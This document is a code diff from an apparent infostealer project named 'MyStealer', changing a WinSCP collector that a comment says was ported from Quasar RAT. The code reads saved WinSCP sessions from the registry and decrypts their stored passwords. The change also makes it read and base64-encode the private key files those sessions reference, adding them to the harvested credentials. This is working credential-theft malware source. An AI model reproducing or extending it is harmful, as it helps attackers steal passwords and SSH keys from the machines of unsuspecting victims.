@@ -13,12 +13,12 @@ namespace MyStealer.Collectors.FtpClient
     /// Ported from Quasar RAT
     /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/FtpClients/WinScpPassReader.cs
     /// </summary>
-    internal class WinScp : IMessengerCollector
+    internal class WinScp : IFtpClientCollector
     {
         public virtual string ApplicationName => "WinScp";
 
         private ILogger lazyLogger;
-        public ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
+        protected ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
 
         public IImmutableSet<CredentialEntry> GetCredentials()
         {
@@ -68,13 +68,20 @@ namespace MyStealer.Collectors.FtpClient
                                     break;
                             }
 
-                            var password = accountKey.GetValue("Password")?.ToString();
+                            var password = "";
                             if (decryptPass)
-                                password = WinScpDecrypt(host, userName, password);
+                                password = WinScpDecrypt(host, userName, accountKey.GetValue("Password")?.ToString());
 
                             var keyfile = accountKey.GetValue("PublicKeyFile")?.ToString();
                             if (!string.IsNullOrEmpty(keyfile))
-                                password = "KeyFile=" + keyfile;
+                            {
+                                password = "Certificate: " + keyfile;
+                                if (File.Exists(keyfile))
+                                {
+                                    var data = Convert.ToBase64String(File.ReadAllBytes(keyfile));
+                                    password = "Certificate: " + data;
+                                }
+                            }
 
                             set.Add(new CredentialEntry
                             {
